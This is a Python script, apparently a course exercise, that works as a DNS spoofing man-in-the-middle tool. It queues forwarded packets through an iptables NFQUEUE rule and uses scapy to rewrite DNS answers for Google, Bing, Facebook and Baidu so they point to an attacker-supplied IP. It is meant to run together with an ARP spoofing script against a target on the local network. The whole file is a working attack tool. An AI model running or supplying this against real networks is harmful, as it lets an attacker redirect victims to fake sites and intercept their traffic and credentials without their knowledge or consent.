"""
A program that acts as MITM (Man In The Middle) to intercept packet.

Algorithm:
    1. Create a queue in hacker machine
    2. Trap packets inside the queue (request -> queue) so they won't be sent to 
       target machines directly
    3. Access and modify the queue 
    4. Send the modified packets as request to target machine
    5. Same way for response

Use iptables: program that allows us to modify route on the computer 
               (routing rule)
              linux command: iptables -I FORWARD -j NFQUEUE --queue-num 0

Caution: Running with arp_spoof.py at the same time. 

Required: netfilterqueue
          pip install netfilterqueue
"""
import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy


# redirct to ip address
ip = ""

# common websites
websites = ["www.google.com", "www.bing.com", "www.facebook.com",
            "wwww.baidu.com"]


def get_arguments():
    # Get command line arguments
    """
    Get the IP Address from user input.

    :return: the ip address that you want to redirect to
    :rtype: str
    """
    parser = optparse.OptionParser()

    # Get the name of intergace from user input
    parser.add_option("-i", "--ip", dest="ip",
                      help="ip address that you want to redirect to")

    (options, arguments) = parser.parse_args()

    # Code to handle error
    if not options.ip:
        parser.error(
            "[-] Please specify an ip address, use --help for more info.")
    return options.ip


def process_packet(packet):
    """
    Callback function that does DNS spoofing so that it redirects target to a 
    certain ip addrss
    
    :param packet: packet
    :type packet: packet
    """
    # convert packet to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # looking DNS response
    # DNSRR: DNS response, DNSRQ: DNS request
    if scapy_packet.haslayer(scapy.DNSRR):
        # qname: url
        qname = scapy_packet[scapy.DNSQR].qname
        for website in websites:
            if website in qname:
                print("[+] Spoofing target")
                # redirect to the ip that is specified in rdata
                answer = scapy.DNSRR(rrname=qname, rdata=ip)
                # modify answer part in DNS layer
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # avoid corruption
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

                packet.set_payload(str(scapy_packet))

                break

        print(scapy_packet.show())

    # forward the packet to destination
    packet.accept()
    # cut the internet connection of the target client
    # i.e. not allowing the packet to reach destination
    # packet.drop()


def use_iptables():
    num_queue = 0
    # local test:
    # subprocess.call(["iptables", "-I", "OUTPUT", "-j",
    # "NFQUEUE", "--queue-num", str(num_queue)])
    # subprocess.call(["iptables", "-I", "INPUT", "-j",
    # "NFQUEUE", "--queue-num", str(num_queue)])

    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE",
                     "--queue-num", str(num_queue)])
    return num_queue


if __name__ == "__main__":
    ip = get_arguments()
    try:
        queue_number = use_iptables()
        queue = netfilterqueue.NetfilterQueue()

        # connect or bind the queue to the queue that we created using iptables
        # by giving queue number
        queue.bind(queue_number, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # remove iptables rule
        subprocess.call(["iptables", "--flush"])
